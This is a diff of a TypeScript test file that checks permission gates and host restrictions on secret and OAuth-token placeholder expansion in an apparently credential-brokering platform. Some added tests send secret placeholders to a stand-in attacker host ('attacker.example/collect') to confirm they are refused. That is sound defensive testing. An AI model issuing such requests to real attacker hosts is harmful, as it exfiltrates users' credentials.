@@ -2,7 +2,7 @@
  * Real-boundary coverage: expandSecretPlaceholders → authorize for ambient
  * credential use. Member / outside collaborator without secret:use or
  * integration:use must not expand org placeholders; Owners and granted
- * actors may. Package authority keeps package attachment (not this gate).
+ * actors may. A saved package never stands in for the person.
  */
 import { DatabaseSync } from 'node:sqlite'
 import {
@@ -39,6 +39,9 @@ async function createOrgDb() {
 	return db
 }
 
+const secretCredentialId = 'cred-secret-org-echo'
+const integrationCredentialId = 'cred-integration-org-google'
+
 function mockPackageManifest(name: string, credentials?: unknown) {
 	return vi
 		.spyOn(packageSource, 'loadPackageManifestBySourceId')
@@ -60,12 +63,20 @@ function userSecret(
 	allowedHosts: Array<string>,
 ): secretService.ResolvedSecret {
 	return {
+		credentialId: secretCredentialId,
 		found: true,
 		value,
 		scope: 'user',
 		allowedHosts,
 		allowedPackages: [],
 	}
+}
+
+function mockSecretForUse(secret: secretService.ResolvedSecret) {
+	const { value: _value, ...found } = secret
+	return vi
+		.spyOn(secretService, 'findSecretForUse')
+		.mockResolvedValue({ found, readValue: async () => secret })
 }
 
 test('ambient fetch placeholders require secret:use / integration:use for members and outside collaborators', async () => {
@@ -124,6 +135,7 @@ test('ambient fetch placeholders require secret:use / integration:use for member
 		orgId: ownerId,
 		resourceType: 'package',
 		resourceId: packageId,
+		family: 'package',
 		subject: { type: 'user', id: collaboratorId },
 		preset: 'use',
 		permissions: null,
@@ -139,9 +151,7 @@ test('ambient fetch placeholders require secret:use / integration:use for member
 		SECRET_STORE_KEY: 'test-secret-store-key-32-chars-minimum',
 	} as unknown as Env
 
-	vi.spyOn(secretService, 'resolveSecret').mockResolvedValue(
-		userSecret('org-secret-value', ['example.com']),
-	)
+	mockSecretForUse(userSecret('org-secret-value', ['example.com']))
 	vi.spyOn(
 		integrationPackageAccess,
 		'assertCanUseIntegration',
@@ -149,7 +159,14 @@ test('ambient fetch placeholders require secret:use / integration:use for member
 	vi.spyOn(
 		integrationCredentials,
 		'resolveIntegrationAccessToken',
-	).mockResolvedValue('oauth-access')
+	).mockResolvedValue({
+		credentialId: integrationCredentialId,
+		accessToken: 'oauth-access',
+	})
+	vi.spyOn(
+		integrationCredentials,
+		'findIntegrationCredentialId',
+	).mockResolvedValue(integrationCredentialId)
 	vi.spyOn(integrationService, 'getJoinedIntegration').mockResolvedValue({
 		lane: 'user',
 		app: { apiBaseUrl: 'https://example.com' },
@@ -247,8 +264,9 @@ test('ambient fetch placeholders require secret:use / integration:use for member
 		code: 'missing_permission',
 		permission: 'secret:use',
 		resource: expect.objectContaining({
-			type: 'secret',
-			id: 'orgEcho',
+			type: 'credential',
+			id: secretCredentialId,
+			label: 'orgEcho',
 		}),
 	})
 	expect(String(memberSecretError)).toMatch(/Missing secret:use/)
@@ -262,8 +280,9 @@ test('ambient fetch placeholders require secret:use / integration:use for member
 		code: 'missing_permission',
 		permission: 'integration:use',
 		resource: expect.objectContaining({
-			type: 'integration',
-			id: 'orgGoogle',
+			type: 'credential',
+			id: integrationCredentialId,
+			label: 'orgGoogle',
 		}),
 	})
 	expect(String(memberIntegrationError)).toMatch(/Missing integration:use/)
@@ -290,14 +309,15 @@ test('ambient fetch placeholders require secret:use / integration:use for member
 		permission: 'integration:use',
 	})
 
-	// Grant secret:use / integration:use on those resources → member may use.
+	// Grant Use on those credential ids → member may use.
 	// Fresh request contexts: effective permissions are cached per request
 	// object, so reusing the pre-grant memberRequest would keep the denial.
 	await upsertGrant({
 		db,
 		orgId: ownerId,
-		resourceType: 'secret',
-		resourceId: 'orgEcho',
+		resourceType: 'credential',
+		resourceId: secretCredentialId,
+		family: 'secret',
 		subject: { type: 'user', id: memberId },
 		preset: 'use',
 		permissions: null,
@@ -307,8 +327,9 @@ test('ambient fetch placeholders require secret:use / integration:use for member
 	await upsertGrant({
 		db,
 		orgId: ownerId,
-		resourceType: 'integration',
-		resourceId: 'orgGoogle',
+		resourceType: 'credential',
+		resourceId: integrationCredentialId,
+		family: 'integration',
 		subject: { type: 'user', id: memberId },
 		preset: 'use',
 		permissions: null,
@@ -335,14 +356,11 @@ test('ambient fetch placeholders require secret:use / integration:use for member
 		'Bearer oauth-access',
 	)
 
-	// Package authority still expands without a secret:use grant (self-authored
-	// package attachment). Collaborator C has no secret grant; package
-	// authority skips the ambient gate.
-	vi.mocked(secretService.resolveSecret).mockResolvedValue(
-		userSecret('pkg-secret-value', ['example.com']),
-	)
+	// Package authority never stands in for the person: collaborator C has no
+	// secret grant, so a saved package they run is denied the secret too.
+	mockSecretForUse(userSecret('pkg-secret-value', ['example.com']))
 	mockPackageManifest('@ownera/notes')
-	const packageAuthoritySecret = await expandSecretPlaceholders({
+	const packageAuthoritySecret = expandSecretPlaceholders({
 		request: secretRequest(),
 		props: {
 			baseUrl: 'https://example.com',
@@ -361,19 +379,26 @@ test('ambient fetch placeholders require secret:use / integration:use for member
 		},
 		env,
 	})
-	expect(packageAuthoritySecret.request.headers.get('Authorization')).toBe(
-		'Bearer pkg-secret-value',
-	)
+	await expect(packageAuthoritySecret).rejects.toMatchObject({
+		name: 'AuthorizationError',
+		code: 'missing_permission',
+		permission: 'secret:use',
+	})
 })
 
-test('leak: a declared package credential is refused outside its placement, in the URL, or over plain HTTP, before it resolves', async () => {
+async function setupDeclaredPackage(input: {
+	username: string
+	packageName: string
+}) {
 	const db = await createOrgDb()
-	const ownerStableId = testStableUserIdFromEmail('owner-p@example.com')
+	const ownerStableId = testStableUserIdFromEmail(
+		`${input.username}@example.com`,
+	)
 	const ownerId = ownerIdFromStored(ownerStableId)
 	const now = '2026-10-11T00:00:00.000Z'
 	await provisionPersonalOrg(db, {
 		stableUserId: ownerId,
-		username: 'ownerp',
+		username: input.username,
 		createdAt: now,
 	})
 	const packageId = crypto.randomUUID()
@@ -382,9 +407,9 @@ test('leak: a declared package credential is refused outside its placement, in t
 		{
 			id: packageId,
 			user_id: ownerId,
-			name: '@ownerp/mailer',
-			kody_id: 'mailer',
-			description: 'mailer',
+			name: input.packageName,
+			kody_id: input.packageName.split('/')[1]!,
+			description: 'test package',
 			tags_json: '[]',
 			search_text: null,
 			source_id: `source-${packageId}`,
@@ -398,47 +423,16 @@ test('leak: a declared package credential is refused outside its placement, in t
 		null,
 		{ stamp: false },
 	)
-	const manifestSpy = mockPackageManifest('@ownerp/mailer', {
-		RESEND_API_KEY: {
-			kind: 'secret',
-			provider: 'resend',
-			description: 'Resend API key.',
-			placement: { header: 'Authorization', template: 'Bearer {value}' },
-		},
-		GOOGLE: { kind: 'oauth', provider: 'google', description: 'Google.' },
-		CLIENT_ID: {
-			kind: 'secret',
-			provider: 'acme',
-			description: 'Acme client id.',
-			placement: { header: 'Authorization' },
-		},
-		CLIENT_SECRET: {
-			kind: 'secret',
-			provider: 'acme',
-			description: 'Acme client secret.',
-			placement: { header: 'Authorization', template: 'Basic {value}' },
-		},
-	})
-	const resolveSpy = vi
-		.spyOn(secretService, 'resolveSecret')
-		.mockResolvedValue(userSecret('resend-secret-value', ['api.resend.com']))
-	const tokenSpy = vi
-		.spyOn(integrationCredentials, 'resolveIntegrationAccessToken')
-		.mockResolvedValue('google-access')
-	vi.spyOn(
-		integrationPackageAccess,
-		'assertCanUseIntegration',
-	).mockResolvedValue(undefined)
-	vi.spyOn(integrationService, 'getJoinedIntegration').mockResolvedValue({
-		lane: 'user',
-		app: { apiBaseUrl: 'https://api.resend.com' },
-		connection: { requiredHosts: ['api.resend.com'] },
-	} as never)
-
 	const ownerRequest = deriveRequestContext({
-		user: { userId: personIdFromStored(ownerStableId), username: 'ownerp' },
+		user: {
+			userId: personIdFromStored(ownerStableId),
+			username: input.username,
+		},
 		source: { kind: 'mcp-oauth' },
-		orgBinding: { org: { id: ownerId, slug: 'ownerp' }, role: 'owner' },
+		orgBinding: {
+			org: { id: ownerId, slug: input.username },
+			role: 'owner',
+		},
 	})
 	const env = {
 		APP_DB: db,
@@ -464,109 +458,92 @@ test('leak: a declared package credential is refused outside its placement, in t
 			},
 			env,
 		}).then(({ request: expanded }) => expanded)
-	const refusal = async (url: string, init: RequestInit = {}) =>
-		String(
-			await expandAsPackage(url, init).then(
-				() => {
-					throw new Error(`Expected ${url} to be refused.`)
-				},
-				(error: unknown) => error,
-			),
-		)
+	return { expandAsPackage }
+}
 
-	const sent = await expandAsPackage('https://api.resend.com/emails', {
-		headers: { Authorization: 'Bearer {{secret:RESEND_API_KEY}}' },
+test('leak: a declared package fills its credentials anywhere on an allowed host over HTTPS, and is refused elsewhere before they resolve', async () => {
+	mockPackageManifest('@ownerp/mailer', {
+		RESEND_API_KEY: {
+			kind: 'secret',
+			provider: 'resend',
+			description: 'Resend API key.',
+		},
+		GOOGLE: { kind: 'oauth', provider: 'google', description: 'Google.' },
 	})
-	expect(sent.headers.get('Authorization')).toBe('Bearer resend-secret-value')
-	const google = await expandAsPackage('https://api.resend.com/emails', {
-		headers: { Authorization: 'Bearer {{integration-token:GOOGLE}}' },
-	})
-	expect(google.headers.get('Authorization')).toBe('Bearer google-access')
-	const basicPair = '{{secret-basic:username=CLIENT_ID,password=CLIENT_SECRET}}'
-	const basic = await expandAsPackage('https://api.resend.com/token', {
-		headers: { Authorization: `Basic ${basicPair}` },
-	})
-	expect(basic.headers.get('Authorization')).toBe(
-		`Basic ${btoa('resend-secret-value:resend-secret-value')}`,
+	const resolveSpy = mockSecretForUse(
+		userSecret('resend-secret-value', ['api.resend.com']),
 	)
+	const tokenSpy = vi
+		.spyOn(integrationCredentials, 'resolveIntegrationAccessToken')
+		.mockResolvedValue({
+			credentialId: integrationCredentialId,
+			accessToken: 'google-access',
+		})
+	vi.spyOn(
+		integrationPackageAccess,
+		'assertCanUseIntegration',
+	).mockResolvedValue(undefined)
+	vi.spyOn(integrationService, 'getJoinedIntegration').mockResolvedValue({
+		lane: 'user',
+		app: { apiBaseUrl: 'https://api.resend.com' },
+		connection: { requiredHosts: ['api.resend.com'] },
+	} as never)
+	const { expandAsPackage } = await setupDeclaredPackage({
+		username: 'ownerp',
+		packageName: '@ownerp/mailer',
+	})
+
+	const header = await expandAsPackage('https://api.resend.com/emails', {
+		headers: { 'X-Api-Key': '{{secret:RESEND_API_KEY}}' },
+	})
+	expect(header.headers.get('X-Api-Key')).toBe('resend-secret-value')
+	const query = await expandAsPackage(
+		'https://api.resend.com/emails?key={{secret:RESEND_API_KEY}}',
+	)
+	expect(new URL(query.url).searchParams.get('key')).toBe('resend-secret-value')
+	const body = await expandAsPackage('https://api.resend.com/oauth/token', {
+		method: 'POST',
+		headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+		body: 'grant_type=x&access_token={{integration-token:GOOGLE}}',
+	})
+	expect(await body.text()).toBe('grant_type=x&access_token=google-access')
 	resolveSpy.mockClear()
 	tokenSpy.mockClear()
 
-	// Outside the declared header or template.
-	expect(
-		await refusal('https://api.resend.com/emails', {
-			headers: { 'X-Api-Key': '{{secret:RESEND_API_KEY}}' },
+	await expect(
+		expandAsPackage('http://api.resend.com/emails', {
+			method: 'POST',
+			body: JSON.stringify({ key: '{{secret:RESEND_API_KEY}}' }),
 		}),
-	).toContain(
-		'Slot "RESEND_API_KEY" of @ownerp/mailer may only be sent in its declared header "Authorization" (as "Bearer {value}"), not in "x-api-key".',
-	)
-	expect(
-		await refusal('https://api.resend.com/emails', {
-			headers: { Authorization: 'Token {{secret:RESEND_API_KEY}}' },
-		}),
-	).toContain(
-		'Slot "RESEND_API_KEY" of @ownerp/mailer must be sent as "Authorization: Bearer {value}"',
-	)
-	expect(
-		await refusal('https://api.resend.com/emails', {
-			headers: { Authorization: 'bearer {{secret:RESEND_API_KEY}}' },
-		}),
-	).toContain('must be sent as "Authorization: Bearer {value}"')
-	expect(
-		await refusal('https://api.resend.com/token', {
-			headers: { Authorization: `X Basic ${basicPair}` },
-		}),
-	).toContain(
-		`Header "authorization" must be exactly "Basic ${basicPair}" to send slots of @ownerp/mailer as Basic Auth.`,
-	)
-	expect(
-		await refusal('https://api.resend.com/token', {
-			headers: {
-				Authorization:
-					'Basic {{secret-basic:username=CLIENT_ID,password=RESEND_API_KEY}}',
-			},
-		}),
-	).toContain(
-		'Slot "RESEND_API_KEY" of @ownerp/mailer declares template "Bearer {value}", but a Basic Auth pair is sent as "Basic {value}".',
-	)
-	expect(
-		await refusal('https://api.resend.com/emails', {
-			headers: { 'X-Token': 'Bearer {{integration-token:GOOGLE}}' },
-		}),
-	).toContain(
-		'Slot "GOOGLE" of @ownerp/mailer may only be sent in its declared header "Authorization"',
-	)
-	expect(
-		await refusal('https://api.resend.com/emails', {
-			headers: { Authorization: 'Bearer {{secret:OTHER_KEY}}' },
-		}),
-	).toContain('"OTHER_KEY" is not a kody.credentials slot of @ownerp/mailer.')
-	expect(
-		await refusal('https://api.resend.com/emails', {
-			headers: { Authorization: 'Bearer {{secret:GOOGLE}}' },
-		}),
-	).toContain(
-		'Slot "GOOGLE" of @ownerp/mailer has kind "oauth", but {{secret:GOOGLE}} needs a slot of kind "secret".',
-	)
-
-	// Outside every header: URL and query.
-	expect(
-		await refusal(
-			'https://api.resend.com/emails?key={{secret:RESEND_API_KEY}}',
+	).rejects.toMatchObject({
+		code: 'credential_placement_refused',
+		slot: 'RESEND_API_KEY',
+		message: expect.stringContaining(
+			'Secret "RESEND_API_KEY" cannot be sent to host "api.resend.com" over plain HTTP.',
 		),
-	).toContain('Secret "RESEND_API_KEY" is in the request URL.')
-
-	// Plain HTTP, even in the declared header.
-	expect(
-		await refusal('http://api.resend.com/emails', {
-			headers: { Authorization: 'Bearer {{secret:RESEND_API_KEY}}' },
-		}),
-	).toContain(
-		'Secret "RESEND_API_KEY" cannot be sent over plain HTTP. The fetch gateway substitutes secrets only over HTTPS.',
-	)
-
+	})
 	expect(resolveSpy).not.toHaveBeenCalled()
+
+	await expect(
+		expandAsPackage('https://attacker.example/collect', {
+			method: 'POST',
+			body: 'token={{integration-token:GOOGLE}}',
+		}),
+	).rejects.toMatchObject({
+		code: 'credential_placement_refused',
+		slot: 'GOOGLE',
+		message: expect.stringContaining('"attacker.example"'),
+	})
+	await expect(
+		expandAsPackage('https://attacker.example/collect', {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({ key: '{{secret:RESEND_API_KEY}}' }),
+		}),
+	).rejects.toMatchObject({
+		code: 'credential_placement_refused',
+		slot: 'RESEND_API_KEY',
+		message: expect.stringContaining('attacker.example'),
+	})
 	expect(tokenSpy).not.toHaveBeenCalled()
-	// One manifest read per run, however many fetches it makes.
-	expect(manifestSpy).toHaveBeenCalledTimes(1)
 })
